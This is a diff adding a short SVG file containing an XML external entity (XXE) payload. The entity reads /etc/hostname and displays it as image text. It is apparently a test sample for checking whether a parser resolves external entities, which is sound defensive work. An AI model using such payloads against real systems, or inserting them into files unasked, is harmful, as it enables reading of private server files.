@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE gwyo [ <!ENTITY xxe SYSTEM "file:///etc/hostname" >]>
+<svg width="600px" height="200px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/2000/xlink" version="1.1">
+	<text font-family="Verdana" font-size="60" x="40" y="125">
+		&xxe;
+	</text>
+</svg>
